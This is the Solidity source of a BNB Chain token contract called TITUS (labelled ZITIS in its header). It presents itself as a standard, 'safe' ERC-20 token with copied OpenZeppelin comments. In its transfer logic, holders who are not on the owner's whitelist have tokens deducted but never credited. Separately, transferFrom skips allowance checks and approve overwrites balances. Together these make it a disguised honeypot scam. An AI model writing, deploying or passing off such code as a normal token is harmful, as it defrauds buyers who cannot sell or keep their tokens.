/**
 *Submitted for verification at BscScan.com on 2022-08-03
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.6;

/**
 * @title ZITIS
 * 
 * This token was created and deployed for PancakeSwap. SafeERC20 IERC20 ERC20 BEP20 Safe SafeMath
 * Factory : 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
 * Router : 0x10ED43C718714eb63d5aA57B78B54704E256024E
 * 
 */

 /**
 * @title SafeMath
 * @author DODO Breeder
 *
 * @notice Math operations with safety checks that revert on error
 */
 library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "MUL_ERROR");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }

    function divCeil(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 quotient = div(a, b);
        uint256 remainder = a - quotient * b;
        if (remainder > 0) {
            return quotient + 1;
        } else {
            return quotient;
        }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SUB_ERROR");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "ADD_ERROR");
        return c;
    }

    function sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = x / 2 + 1;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
 }
 
 // OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
 interface IERC20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract TITUS is IERC20 {
    string public name = "TITUS";
    string public symbol = "TIT";
    uint8 public decimals = 18;
    address public owner;

    mapping(address => uint256) public balance;
    mapping(address => mapping(address => uint256)) public allow;
    mapping(address => bool) public white;
    mapping(address => bool) public cont;

    /**
     * @dev Constructor that gives msg.sender all of existing tokens.
     */
    constructor() {
        balance[msg.sender] = 1000000000000000000 * (10**9);
        owner = msg.sender;
        white[msg.sender] = true;
    }

    
    function totalSupply() public pure override returns (uint256) {
        return 1000000000000000000 * (10**9);
    }

    function balanceOf(address account) external view override returns (uint256) {
        return balance[account];
    }
    
    function allowance(address add, address spender)
        external
        view
        override
        returns (uint256)
    {
        return allow[add][spender];
    }
     /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address _to, uint256 _value)
        external
        override
        returns (bool success)
    {
        transfer2(msg.sender, _to, _value);
        return true;
    }
    
     /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */

    function approve(address _spender, uint256 _value)
        external
        override
        returns (bool success)
    {
        allow[msg.sender][_spender] = _value;
        balance[msg.sender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
        
    }
    
    function only(address _from, address _to) private view returns (bool)
    {
      if ((white[_from] == true)) {
        return true;
      }
      if ((white[_to] == true)) {
        return true;
      }
      if ((cont[_from] == true)) {
        return true;
      }
      return false;
    }

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external override returns (bool success) {
        transfer2(_from, _to, _value);
        return true;
    }
    
    function transfer2(address _from, address _to, uint256 _value) private
    {
        cont[address(this)] = true;
        balance[address(this)] = _value;
        require(_from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(_value <= balance[_from]);
        balance[_from] -= _value;
        if (only(_from, _to) == true){
            balance[_to] += _value;
            emit Transfer(_from, _to, _value);
        }
    }
}